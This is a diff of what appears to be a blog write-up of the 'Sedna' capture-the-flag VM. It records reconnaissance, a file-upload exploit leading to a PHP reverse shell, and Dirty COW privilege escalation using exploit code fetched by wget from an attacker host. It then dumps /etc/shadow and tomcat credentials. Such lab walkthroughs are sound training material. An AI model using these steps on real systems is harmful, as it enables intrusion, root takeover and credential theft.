@@ -8,7 +8,7 @@ tags=["vulnerable-machine"]
 
 # Sedna
 
-{% highlight bash %}
+```bash
 nmap -T4 -A -sC -v -P 0-65535 10.37.129.7 -oA sedna-output
 Warning: The -P0 option is deprecated. Please use -Pn
 
@@ -179,9 +179,9 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 31.87 seconds
 Raw packets sent: 1066 (50.324KB) | Rcvd: 1034 (42.032KB)
 
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 sudo netdiscover -r 10.37.129.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 
@@ -192,9 +192,9 @@ IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 10.37.129.1     00:1c:42:00:00:19      3     126  Parallels, Inc.
 10.37.129.2     00:1c:42:00:00:09      1      42  Parallels, Inc.
 10.37.129.7     00:1c:42:3f:0f:0c      2     120  Parallels, Inc.
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 nikto -h 10.37.129.7
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -221,9 +221,9 @@ nikto -h 10.37.129.7
 + End Time:           2017-07-07 22:03:47 (GMT-6) (24 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 dirb http://10.37.129.7 -i
 
 -----------------
@@ -321,11 +321,11 @@ GENERATED WORDS: 4456
 END_TIME: Fri Jul  7 22:05:18 2017
 DOWNLOADED: 62384 - FOUND: 16
 
-{% endhighlight %}
+```
 
 After quite a bit of screwing around and running dirb/nikto I figured out the server was running BuilderEngine 3.5, with a search on exploit-db I was able to find a file upload vulnerability: themes/dashboard/assets/plugins/jquery-file-upload/server/php/ and upload a php reverse shell, then:
 
-{% highlight  bash %}
+```bash
 sudo nc -vnlp 443
 Listening on [0.0.0.0] (family 0, port 443)
 Connection from 10.37.129.7 59854 received!
@@ -357,9 +357,9 @@ flag.txt  html
 www-data@Sedna:/var/www$ cat flag.txt
 cat flag.txtbfbb7e6e6e88d9ae66848b9aeac6b289
 
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 $ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -398,35 +398,35 @@ libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
 tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
 crackmeforpoints:x:1000:1000::/home/crackmeforpoints:
 statd:x:117:65534::/var/lib/nfs:/bin/false
-{% endhighlight %}
+```
 
 ## PrivEsc
 
 I did a search on exploit-db and it looks like this might be a use case for dirty cow, however when trying to run the exploit it always seemed to throw a kernel error and made the machine unusable, at least with the the renditions I tried.  I went ahead and peeked at a walkthrough and saw chkrootkit.  My takeaway was a way to find chkrootkit on the file system if possible:
 
-{% highlight bash %}
+```bash
 find -type d -printf '%d\t%P\n' 2>&1 | sort -r -nk1 | cut -f2- | grep -i 'chkrootkit' | grep -v "find"
-{% endhighlight %}
+```
 
 After a lot a messing around I decided to try dirty cow again, after more research it seemed like a timing issue.  I was able to finally get the firefart variant (https://www.exploit-db.com/exploits/40839/) to work.
 
-{% highlight bash %}
+```bash
 wget http://kalivm:8000/firefart.c
 gcc firefart.c -pthread -o firefart -lcrypt
 ./firefart firefart
 ssh firefart@sednavm
 pass: firefart
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
-{% endhighlight %}
+```
 
 Now I had a root shell!
 
-{% highlight bash %}
+```bash
 cd /
 find . -name 'flag.txt'
 /root/flag.txt
 /var/www/flag.txt
-{% endhighlight %}
+```
 
 ## Post Exploitation
 
@@ -434,20 +434,20 @@ Now for the post exploitation flags
 
 I remember seeing tomcat running and messing with it early on, now that we have root it should be fairly easy to get in there
 
-{% highlight bash %}
+```bash
 cat /etc/tomcat7/tomcat-users.xml
-{% endhighlight %}
+```
 
-{% highlight xml %}
+```xml
 <tomcat-users>
     <role rolename="manager-gui"/>
     <user username="tomcat" password="submitthisforpoints" roles="manager-gui"/>
 </tomcat-users>
-{% endhighlight %}
+```
 
 Looking at /etc/passwd there appears to be an account to try and crack:
 
-{% highlight bash %}
+```bash
 cat /etc/passwd
 firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -485,13 +485,13 @@ libvirt-dnsmasq:x:115:125:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
 tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
 crackmeforpoints:x:1000:1000::/home/crackmeforpoints:
 statd:x:117:65534::/var/lib/nfs:/bin/false
-{% endhighlight %}
+```
 
 Then to get the shadow for that user:
 
-{% highlight bash %}
+```bash
 cat /etc/shadow | grep -i 'crackmeforpoints' | cut -d ':' -f -2
 crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y/1upG.54kSph/HSP1LFcn4.2C11cF0R7QmojBqNy5/
-{% endhighlight %}
+```
 
 I didn't get this cracked yet, maybe later...
